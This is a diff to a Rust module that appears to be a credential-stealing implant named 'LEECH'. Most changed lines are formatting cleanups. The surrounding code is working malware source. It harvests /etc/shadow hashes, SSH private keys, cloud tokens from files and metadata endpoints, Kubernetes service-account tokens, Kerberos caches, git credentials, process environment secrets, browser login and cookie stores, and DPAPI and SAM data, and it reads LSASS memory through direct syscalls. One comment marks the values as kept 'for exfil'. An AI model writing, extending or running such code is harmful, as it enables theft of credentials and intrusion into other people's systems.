@@ -4,12 +4,12 @@
 //
 // Results tagged with priority — 10 = nectar_premium, 1 = low value.
 
-use std::io::{Seek, SeekFrom, Read};
+#[cfg(target_os = "windows")]
+use crate::syscalls;
+use std::io::{Read, Seek, SeekFrom};
 use std::path::Path;
 use std::process::Command;
 use tracing::info;
-#[cfg(target_os = "windows")]
-use crate::syscalls;
 
 // ── types ────────────────────────────────────────────────────────────────────
 
@@ -70,7 +70,10 @@ pub fn harvest_all() -> Vec<LeechHarvest> {
 }
 
 pub fn harvest_high_value() -> Vec<LeechHarvest> {
-    harvest_all().into_iter().filter(|h| h.priority >= 8).collect()
+    harvest_all()
+        .into_iter()
+        .filter(|h| h.priority >= 8)
+        .collect()
 }
 
 // ── 1. /etc/shadow (Linux) ───────────────────────────────────────────────────
@@ -94,7 +97,7 @@ fn harvest_shadow() -> Vec<LeechHarvest> {
         // Detect empty/disabled/weak
         let priority = if hash.is_empty() || hash == "*" || hash == "!" {
             5
-        } else if hash == "" || hash.starts_with("$6$") {
+        } else if hash.is_empty() || hash.starts_with("$6$") {
             9 // SHA-512, likely real
         } else if hash.starts_with("$5$") {
             8 // SHA-256
@@ -163,7 +166,12 @@ fn harvest_process_memory() -> Vec<LeechHarvest> {
             }
             // Skip device-mapped regions (file-backed, non-anonymous)
             let pathname = parts.get(5).unwrap_or(&"");
-            if !pathname.is_empty() && !pathname.contains("[heap]") && !pathname.contains("[stack]") && !pathname.contains("[vdso]") && !pathname.contains("[vvar]") {
+            if !pathname.is_empty()
+                && !pathname.contains("[heap]")
+                && !pathname.contains("[stack]")
+                && !pathname.contains("[vdso]")
+                && !pathname.contains("[vvar]")
+            {
                 continue;
             }
             let addrs: Vec<&str> = parts[0].split('-').collect();
@@ -189,9 +197,19 @@ fn harvest_process_memory() -> Vec<LeechHarvest> {
 
         let mut buf = vec![0u8; 4096];
         let possible_creds: &[&[u8]] = &[
-            b"password", b"secret", b"token", b"key=", b"-----BEGIN",
-            b"AWS_SECRET", b"AWS_ACCESS", b"ghp_", b"gho_", b"xoxp-",
-            b"Authorization: Bearer", b"JWT", b"eyJ", // JWT header
+            b"password",
+            b"secret",
+            b"token",
+            b"key=",
+            b"-----BEGIN",
+            b"AWS_SECRET",
+            b"AWS_ACCESS",
+            b"ghp_",
+            b"gho_",
+            b"xoxp-",
+            b"Authorization: Bearer",
+            b"JWT",
+            b"eyJ", // JWT header
         ];
 
         for (start, end) in &regions {
@@ -207,7 +225,11 @@ fn harvest_process_memory() -> Vec<LeechHarvest> {
                     let lower = text.to_lowercase();
                     for pat in possible_creds {
                         if lower.contains(std::str::from_utf8(pat).unwrap_or("")) {
-                            let snippet: String = text.chars().filter(|c| c.is_ascii_graphic() || *c == ' ').take(120).collect();
+                            let snippet: String = text
+                                .chars()
+                                .filter(|c| c.is_ascii_graphic() || *c == ' ')
+                                .take(120)
+                                .collect();
                             if snippet.len() > 10 {
                                 creds.push(LeechHarvest {
                                     credential_type: CredType::ProcessMemory,
@@ -247,14 +269,19 @@ fn harvest_ssh_keys() -> Vec<LeechHarvest> {
         let name = entry.file_name().to_string_lossy().to_string();
 
         // Collect private keys (id_*, and any key file)
-        if name.starts_with("id_") || name.contains("_rsa") || name.contains("_ecdsa") || name.contains("_ed25519") || name == "identity" {
+        if name.starts_with("id_")
+            || name.contains("_rsa")
+            || name.contains("_ecdsa")
+            || name.contains("_ed25519")
+            || name == "identity"
+        {
             if let Ok(data) = std::fs::read_to_string(&path) {
                 if data.contains("-----BEGIN") {
                     creds.push(LeechHarvest {
                         credential_type: CredType::SSHKey,
                         username: home.clone(),
                         domain: name.clone(),
-                        data: data,
+                        data,
                         source_process: format!("{}/{}", ssh_dir, name),
                         priority: 10,
                     });
@@ -265,7 +292,10 @@ fn harvest_ssh_keys() -> Vec<LeechHarvest> {
         // known_hosts for lateral targeting
         if name == "known_hosts" {
             if let Ok(data) = std::fs::read_to_string(&path) {
-                let hosts: Vec<&str> = data.lines().filter(|l| !l.is_empty() && !l.starts_with('#')).collect();
+                let hosts: Vec<&str> = data
+                    .lines()
+                    .filter(|l| !l.is_empty() && !l.starts_with('#'))
+                    .collect();
                 if !hosts.is_empty() {
                     creds.push(LeechHarvest {
                         credential_type: CredType::SSHKey,
@@ -316,7 +346,9 @@ fn harvest_cloud_tokens() -> Vec<LeechHarvest> {
     // ── AWS ──────────────────────────────────────────────────────────────
     let aws_creds = format!("{}/.aws/credentials", home);
     if let Ok(data) = std::fs::read_to_string(&aws_creds) {
-        let has_keys = data.contains("aws_access_key_id") || data.contains("aws_secret_access_key") || data.contains("aws_session_token");
+        let has_keys = data.contains("aws_access_key_id")
+            || data.contains("aws_secret_access_key")
+            || data.contains("aws_session_token");
         if has_keys {
             let count = data.matches("aws_access_key_id").count();
             creds.push(LeechHarvest {
@@ -348,7 +380,7 @@ fn harvest_cloud_tokens() -> Vec<LeechHarvest> {
     let aws_sso = format!("{}/.aws/sso/cache", home);
     if let Ok(entries) = std::fs::read_dir(&aws_sso) {
         for entry in entries.flatten() {
-            if let Ok(data) = std::fs::read_to_string(&entry.path()) {
+            if let Ok(data) = std::fs::read_to_string(entry.path()) {
                 creds.push(LeechHarvest {
                     credential_type: CredType::CloudTokenAWS,
                     username: "aws_sso".into(),
@@ -398,7 +430,7 @@ fn harvest_cloud_tokens() -> Vec<LeechHarvest> {
             for entry in entries.flatten() {
                 let name = entry.file_name().to_string_lossy().to_string();
                 if name.ends_with(".json") && name != "application_default_credentials.json" {
-                    if let Ok(data) = std::fs::read_to_string(&entry.path()) {
+                    if let Ok(data) = std::fs::read_to_string(entry.path()) {
                         if data.contains("access_token") || data.contains("refresh_token") {
                             creds.push(LeechHarvest {
                                 credential_type: CredType::CloudTokenGCP,
@@ -416,7 +448,8 @@ fn harvest_cloud_tokens() -> Vec<LeechHarvest> {
     }
 
     // GCP metadata endpoint (check if running inside GCP)
-    if let Ok(resp) = client.get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/")
+    if let Ok(resp) = client
+        .get("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/")
         .header("Metadata-Flavor", "Google")
         .send()
         .and_then(|r| r.text())
@@ -487,11 +520,7 @@ fn harvest_cloud_tokens() -> Vec<LeechHarvest> {
 
     // Azure metadata endpoint (check if inside Azure VM)
     let azure_metadata = "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/";
-    if let Ok(resp) = client
-        .get(azure_metadata)
-        .header("Metadata", "true")
-        .send()
-    {
+    if let Ok(resp) = client.get(azure_metadata).header("Metadata", "true").send() {
         if resp.status().is_success() {
             if let Ok(body) = resp.text() {
                 creds.push(LeechHarvest {
@@ -548,7 +577,9 @@ fn harvest_cloud_tokens() -> Vec<LeechHarvest> {
     // K8s service account token (in-cluster)
     let k8s_sa_token = "/var/run/secrets/kubernetes.io/serviceaccount/token";
     if let Ok(data) = std::fs::read_to_string(k8s_sa_token) {
-        let k8s_sa_namespace = std::fs::read_to_string("/var/run/secrets/kubernetes.io/serviceaccount/namespace").unwrap_or_default();
+        let k8s_sa_namespace =
+            std::fs::read_to_string("/var/run/secrets/kubernetes.io/serviceaccount/namespace")
+                .unwrap_or_default();
         creds.push(LeechHarvest {
             credential_type: CredType::CloudTokenK8s,
             username: format!("k8s_sa_{}", k8s_sa_namespace.trim()),
@@ -652,7 +683,7 @@ fn harvest_vault_tokens() -> Vec<LeechHarvest> {
         let private_keys = format!("{}/private-keys-v1.d", gnupg_dir);
         if let Ok(entries) = std::fs::read_dir(&private_keys) {
             for entry in entries.flatten() {
-                if let Ok(data) = std::fs::read(&entry.path()) {
+                if let Ok(data) = std::fs::read(entry.path()) {
                     if !data.is_empty() {
                         creds.push(LeechHarvest {
                             credential_type: CredType::GnupgKey,
@@ -677,10 +708,7 @@ fn harvest_kerberos_tickets() -> Vec<LeechHarvest> {
     let mut creds = Vec::new();
     let uid = std::process::id();
 
-    for cache_path in &[
-        format!("/tmp/krb5cc_{}", uid),
-        "/tmp/krb5cc_0".to_string(),
-    ] {
+    for cache_path in &[format!("/tmp/krb5cc_{}", uid), "/tmp/krb5cc_0".to_string()] {
         if !Path::new(cache_path).exists() {
             continue;
         }
@@ -749,8 +777,18 @@ fn harvest_cached_credentials() -> Vec<LeechHarvest> {
             if line.contains("://") && line.contains('@') {
                 creds.push(LeechHarvest {
                     credential_type: CredType::ClearTextPassword,
-                    username: line.split("://").nth(1).and_then(|s| s.split('@').next()).unwrap_or("?").to_string(),
-                    domain: line.split('@').nth(1).and_then(|s| s.split('/').next()).unwrap_or("?").to_string(),
+                    username: line
+                        .split("://")
+                        .nth(1)
+                        .and_then(|s| s.split('@').next())
+                        .unwrap_or("?")
+                        .to_string(),
+                    domain: line
+                        .split('@')
+                        .nth(1)
+                        .and_then(|s| s.split('/').next())
+                        .unwrap_or("?")
+                        .to_string(),
                     data: line.to_string(),
                     source_process: "git-credential-cache".into(),
                     priority: 9,
@@ -763,7 +801,11 @@ fn harvest_cached_credentials() -> Vec<LeechHarvest> {
     let git_config = format!("{}/.gitconfig", home);
     if let Ok(data) = std::fs::read_to_string(&git_config) {
         let lower = data.to_lowercase();
-        if lower.contains("password") || lower.contains("token") || lower.contains("ghp_") || lower.contains("gho_") {
+        if lower.contains("password")
+            || lower.contains("token")
+            || lower.contains("ghp_")
+            || lower.contains("gho_")
+        {
             creds.push(LeechHarvest {
                 credential_type: CredType::ClearTextPassword,
                 username: "gitconfig".into(),
@@ -782,22 +824,38 @@ fn harvest_cached_credentials() -> Vec<LeechHarvest> {
             if let Ok(env) = std::fs::read_to_string(pid_dir.join("environ")) {
                 for var in env.split('\0') {
                     let lower = var.to_lowercase();
-                    if (lower.contains("password") || lower.contains("secret")
-                        || lower.contains("token") || lower.contains("key")
-                        || lower.contains("credential") || lower.contains("api_key"))
+                    if (lower.contains("password")
+                        || lower.contains("secret")
+                        || lower.contains("token")
+                        || lower.contains("key")
+                        || lower.contains("credential")
+                        || lower.contains("api_key"))
                         && var.len() < 500
                     {
                         let key_val: Vec<&str> = var.splitn(2, '=').collect();
-                        let key = key_val.get(0).unwrap_or(&"").to_string();
+                        let key = key_val.first().unwrap_or(&"").to_string();
                         let val = key_val.get(1).unwrap_or(&"").to_string();
                         // Redact value if too sensitive for logs but keep for exfil
-                        let priority = if key.to_lowercase().contains("password") || key.to_lowercase().contains("secret") { 10 } else { 8 };
+                        let priority = if key.to_lowercase().contains("password")
+                            || key.to_lowercase().contains("secret")
+                        {
+                            10
+                        } else {
+                            8
+                        };
                         creds.push(LeechHarvest {
                             credential_type: CredType::ClearTextPassword,
-                            username: format!("{}/{}", pid_dir.file_name().unwrap().to_string_lossy(), key),
+                            username: format!(
+                                "{}/{}",
+                                pid_dir.file_name().unwrap().to_string_lossy(),
+                                key
+                            ),
                             domain: "proc_environ".into(),
                             data: format!("{}={}", key, val),
-                            source_process: format!("pid_{}/environ", pid_dir.file_name().unwrap().to_string_lossy()),
+                            source_process: format!(
+                                "pid_{}/environ",
+                                pid_dir.file_name().unwrap().to_string_lossy()
+                            ),
                             priority,
                         });
                     }
@@ -807,12 +865,28 @@ fn harvest_cached_credentials() -> Vec<LeechHarvest> {
     }
 
     // Sensitive env vars in current process
-    let sensitive_vars = ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
-        "GOOGLE_APPLICATION_CREDENTIALS", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
-        "GITHUB_TOKEN", "GITLAB_TOKEN", "DOCKER_API_TOKEN", "SLACK_TOKEN",
-        "DIGITALOCEAN_TOKEN", "LINODE_TOKEN", "DO_API_TOKEN", "HCLOUD_TOKEN",
-        "DATADOG_API_KEY", "NEW_RELIC_LICENSE_KEY", "CF_API_TOKEN",
-        "VAULT_TOKEN", "VAULT_ADDR", "ARM_CLIENT_SECRET", "ARM_SUBSCRIPTION_ID",
+    let sensitive_vars = [
+        "AWS_ACCESS_KEY_ID",
+        "AWS_SECRET_ACCESS_KEY",
+        "AWS_SESSION_TOKEN",
+        "GOOGLE_APPLICATION_CREDENTIALS",
+        "AZURE_CLIENT_SECRET",
+        "AZURE_TENANT_ID",
+        "GITHUB_TOKEN",
+        "GITLAB_TOKEN",
+        "DOCKER_API_TOKEN",
+        "SLACK_TOKEN",
+        "DIGITALOCEAN_TOKEN",
+        "LINODE_TOKEN",
+        "DO_API_TOKEN",
+        "HCLOUD_TOKEN",
+        "DATADOG_API_KEY",
+        "NEW_RELIC_LICENSE_KEY",
+        "CF_API_TOKEN",
+        "VAULT_TOKEN",
+        "VAULT_ADDR",
+        "ARM_CLIENT_SECRET",
+        "ARM_SUBSCRIPTION_ID",
     ];
     for var_name in &sensitive_vars {
         if let Ok(val) = std::env::var(var_name) {
@@ -861,7 +935,11 @@ fn harvest_browser_passwords() -> Vec<LeechHarvest> {
                         creds.push(LeechHarvest {
                             credential_type: CredType::BrowserPassword,
                             username: "chrome_encrypted".into(),
-                            domain: format!("{}:{}", base.split('/').last().unwrap_or("browser"), name),
+                            domain: format!(
+                                "{}:{}",
+                                base.split('/').next_back().unwrap_or("browser"),
+                                name
+                            ),
                             data: login_data.display().to_string(),
                             source_process: login_data.display().to_string(),
                             priority: 8,
@@ -872,7 +950,11 @@ fn harvest_browser_passwords() -> Vec<LeechHarvest> {
                         creds.push(LeechHarvest {
                             credential_type: CredType::BrowserPassword,
                             username: "chrome_cookies".into(),
-                            domain: format!("{}:{}", base.split('/').last().unwrap_or("browser"), name),
+                            domain: format!(
+                                "{}:{}",
+                                base.split('/').next_back().unwrap_or("browser"),
+                                name
+                            ),
                             data: cookies.display().to_string(),
                             source_process: cookies.display().to_string(),
                             priority: 5,
@@ -953,24 +1035,34 @@ fn harvest_rdp_credentials() -> Vec<LeechHarvest> {
 fn harvest_lsass() -> Vec<LeechHarvest> {
     let mut creds = Vec::new();
     let lsass_pid = find_process_pid("lsass.exe");
-    if lsass_pid == 0 { return creds; }
+    if lsass_pid == 0 {
+        return creds;
+    }
 
     unsafe {
         let ssn_open = syscalls::resolve_ssn("NtOpenProcess").unwrap_or(0);
         let ssn_read = syscalls::resolve_ssn("NtReadVirtualMemory").unwrap_or(0);
         let ssn_query = syscalls::resolve_ssn("NtQueryVirtualMemory").unwrap_or(0);
-        if ssn_open == 0 || ssn_read == 0 { return creds; }
+        if ssn_open == 0 || ssn_read == 0 {
+            return creds;
+        }
 
         let mut handle: isize = 0;
         let cid = [lsass_pid as usize, 0usize];
         let oa = [0usize; 6];
-        syscalls::nt_syscall(ssn_open, &[
-            &mut handle as *mut isize as usize,
-            (winapi::um::winnt::PROCESS_VM_READ | winapi::um::winnt::PROCESS_QUERY_INFORMATION) as usize,
-            &oa as *const _ as usize,
-            &cid as *const _ as usize,
-        ]);
-        if handle == 0 { return creds; }
+        syscalls::nt_syscall(
+            ssn_open,
+            &[
+                &mut handle as *mut isize as usize,
+                (winapi::um::winnt::PROCESS_VM_READ | winapi::um::winnt::PROCESS_QUERY_INFORMATION)
+                    as usize,
+                &oa as *const _ as usize,
+                &cid as *const _ as usize,
+            ],
+        );
+        if handle == 0 {
+            return creds;
+        }
 
         let mut total_bytes = 0u64;
         let mut address: usize = 0;
@@ -979,14 +1071,19 @@ fn harvest_lsass() -> Vec<LeechHarvest> {
         loop {
             let mut mbi: [u8; 48] = std::mem::zeroed();
             let mut ret_len: usize = 0;
-            let status = syscalls::nt_syscall(ssn_query, &[
-                handle as usize,
-                address,
-                &mut mbi as *mut _ as usize,
-                48,
-                &mut ret_len as *mut _ as usize,
-            ]);
-            if status != 0 { break; }
+            let status = syscalls::nt_syscall(
+                ssn_query,
+                &[
+                    handle as usize,
+                    address,
+                    &mut mbi as *mut _ as usize,
+                    48,
+                    &mut ret_len as *mut _ as usize,
+                ],
+            );
+            if status != 0 {
+                break;
+            }
 
             // Parse MEMORY_BASIC_INFORMATION
             let base_addr = std::ptr::read(&mbi[0] as *const u8 as *const usize);
@@ -997,39 +1094,65 @@ fn harvest_lsass() -> Vec<LeechHarvest> {
             const MEM_COMMIT: u32 = 0x1000;
             const PAGE_READABLE: u32 = 0x02 | 0x04 | 0x10 | 0x20 | 0x40 | 0x80;
 
-            if state == MEM_COMMIT && (protect & PAGE_READABLE) != 0 && region_size > 0 && region_size < 0x1000000 {
+            if state == MEM_COMMIT
+                && (protect & PAGE_READABLE) != 0
+                && region_size > 0
+                && region_size < 0x1000000
+            {
                 let mut buf = vec![0u8; region_size.min(page_size)];
                 for offset in (0..region_size).step_by(page_size) {
-                    if buf.len() != page_size { buf.resize(page_size, 0); }
-                    let read_status = syscalls::nt_syscall(ssn_read, &[
-                        handle as usize,
-                        base_addr + offset,
-                        buf.as_mut_ptr() as usize,
-                        page_size,
-                        0,
-                    ]);
+                    if buf.len() != page_size {
+                        buf.resize(page_size, 0);
+                    }
+                    let read_status = syscalls::nt_syscall(
+                        ssn_read,
+                        &[
+                            handle as usize,
+                            base_addr + offset,
+                            buf.as_mut_ptr() as usize,
+                            page_size,
+                            0,
+                        ],
+                    );
                     if read_status == 0 {
                         total_bytes += page_size as u64;
                         // Search for credential patterns in the buffer
                         let text = String::from_utf8_lossy(&buf);
-                        for pat in &["wdigest", "kerberos", "msv1_0", "livessp", "cloudap", "wdigest.dll", "kerberos.dll"] {
+                        for pat in &[
+                            "wdigest",
+                            "kerberos",
+                            "msv1_0",
+                            "livessp",
+                            "cloudap",
+                            "wdigest.dll",
+                            "kerberos.dll",
+                        ] {
                             if text.contains(pat) {
                                 let context: String = text.chars().take(100).collect();
-                                info!("LEECH: LSASS credential pattern '{}' found at 0x{:x}", pat, base_addr + offset);
+                                info!(
+                                    "LEECH: LSASS credential pattern '{}' found at 0x{:x}",
+                                    pat,
+                                    base_addr + offset
+                                );
                             }
                         }
                     }
                 }
             }
             address = base_addr + region_size;
-            if address == 0 || region_size == 0 { break; }
+            if address == 0 || region_size == 0 {
+                break;
+            }
         }
 
         creds.push(LeechHarvest {
             credential_type: CredType::ProcessMemory,
             username: "lsass_dump".into(),
             domain: "lsass".into(),
-            data: format!("LSASS pid={} scanned via direct syscalls, {} bytes read", lsass_pid, total_bytes),
+            data: format!(
+                "LSASS pid={} scanned via direct syscalls, {} bytes read",
+                lsass_pid, total_bytes
+            ),
             source_process: "lsass.exe".into(),
             priority: 10,
         });
@@ -1048,11 +1171,11 @@ fn harvest_sam() -> Vec<LeechHarvest> {
     let mut creds = Vec::new();
     let sam_path = r"SYSTEM\CurrentControlSet\Control\Lsa\Data";
     unsafe {
-        use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE};
-        use winapi::um::winnt::KEY_READ;
-        use winapi::shared::minwindef::HKEY__;
         use std::ffi::OsStr;
         use std::os::windows::ffi::OsStrExt;
+        use winapi::shared::minwindef::HKEY__;
+        use winapi::um::winnt::KEY_READ;
+        use winapi::um::winreg::{RegOpenKeyExW, RegQueryValueExW, HKEY_LOCAL_MACHINE};
 
         let wide: Vec<u16> = OsStr::new(sam_path).encode_wide().chain(Some(0)).collect();
         let mut hkey: *mut HKEY__ = std::ptr::null_mut();
@@ -1094,13 +1217,19 @@ fn harvest_sam() -> Vec<LeechHarvest> {
 fn harvest_dpapi() -> Vec<LeechHarvest> {
     let mut creds = Vec::new();
     if let Ok(appdata) = std::env::var("APPDATA") {
-        let protect_dir = std::path::Path::new(&appdata).join("Microsoft").join("Protect");
+        let protect_dir = std::path::Path::new(&appdata)
+            .join("Microsoft")
+            .join("Protect");
         if protect_dir.exists() {
             if let Ok(entries) = std::fs::read_dir(&protect_dir) {
                 for entry in entries.flatten() {
                     let path = entry.path();
                     if path.is_file() && path.extension().and_then(|e| e.to_str()) == Some("") {
-                        let name = path.file_name().unwrap_or_default().to_string_lossy().to_string();
+                        let name = path
+                            .file_name()
+                            .unwrap_or_default()
+                            .to_string_lossy()
+                            .to_string();
                         creds.push(LeechHarvest {
                             credential_type: CredType::AccessToken,
                             username: name,
@@ -1115,9 +1244,11 @@ fn harvest_dpapi() -> Vec<LeechHarvest> {
         }
     }
     if let Ok(localappdata) = std::env::var("LOCALAPPDATA") {
-        for browser_dir in &["Google\\Chrome\\User Data\\Default\\Local Storage",
-                              "Microsoft\\Edge\\User Data\\Default\\Local Storage",
-                              "BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage"] {
+        for browser_dir in &[
+            "Google\\Chrome\\User Data\\Default\\Local Storage",
+            "Microsoft\\Edge\\User Data\\Default\\Local Storage",
+            "BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage",
+        ] {
             let path = std::path::Path::new(&localappdata).join(browser_dir);
             if path.exists() {
                 creds.push(LeechHarvest {
@@ -1151,7 +1282,7 @@ fn find_process_pid(name: &str) -> u32 {
         pe.dwSize = std::mem::size_of::<winapi::um::tlhelp32::PROCESSENTRY32W>() as u32;
         if winapi::um::tlhelp32::Process32FirstW(snapshot, &mut pe) != 0 {
             loop {
-                if pe.szExeFile == wide[..wide.len()-1] {
+                if pe.szExeFile == wide[..wide.len() - 1] {
                     let pid = pe.th32ProcessID;
                     winapi::um::handleapi::CloseHandle(snapshot);
                     return pid;
@@ -1170,12 +1301,24 @@ fn find_process_pid(name: &str) -> u32 {
 
 fn _sensitive_env_vars() -> Vec<&'static str> {
     vec![
-        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
-        "GOOGLE_APPLICATION_CREDENTIALS", "AZURE_CLIENT_SECRET", "AZURE_TENANT_ID",
-        "GITHUB_TOKEN", "GITLAB_TOKEN", "DOCKER_API_TOKEN", "SLACK_TOKEN",
-        "DIGITALOCEAN_TOKEN", "LINODE_TOKEN", "VAULT_TOKEN",
-        "DATADOG_API_KEY", "NEW_RELIC_LICENSE_KEY", "CF_API_TOKEN",
-        "ARM_CLIENT_SECRET", "ARM_SUBSCRIPTION_ID",
+        "AWS_ACCESS_KEY_ID",
+        "AWS_SECRET_ACCESS_KEY",
+        "AWS_SESSION_TOKEN",
+        "GOOGLE_APPLICATION_CREDENTIALS",
+        "AZURE_CLIENT_SECRET",
+        "AZURE_TENANT_ID",
+        "GITHUB_TOKEN",
+        "GITLAB_TOKEN",
+        "DOCKER_API_TOKEN",
+        "SLACK_TOKEN",
+        "DIGITALOCEAN_TOKEN",
+        "LINODE_TOKEN",
+        "VAULT_TOKEN",
+        "DATADOG_API_KEY",
+        "NEW_RELIC_LICENSE_KEY",
+        "CF_API_TOKEN",
+        "ARM_CLIENT_SECRET",
+        "ARM_SUBSCRIPTION_ID",
     ]
 }
 
@@ -1208,9 +1351,12 @@ mod tests {
         let creds = harvest_cloud_tokens();
         // Should not crash regardless of environment
         for c in &creds {
-            assert!(matches!(c.credential_type,
-                CredType::CloudTokenAWS | CredType::CloudTokenGCP |
-                CredType::CloudTokenAzure | CredType::CloudTokenK8s
+            assert!(matches!(
+                c.credential_type,
+                CredType::CloudTokenAWS
+                    | CredType::CloudTokenGCP
+                    | CredType::CloudTokenAzure
+                    | CredType::CloudTokenK8s
             ));
         }
     }
@@ -1242,7 +1388,10 @@ mod tests {
     fn test_harvest_vault_tokens() {
         let creds = harvest_vault_tokens();
         for c in &creds {
-            assert!(matches!(c.credential_type, CredType::VaultToken | CredType::GnupgKey));
+            assert!(matches!(
+                c.credential_type,
+                CredType::VaultToken | CredType::GnupgKey
+            ));
         }
     }
 
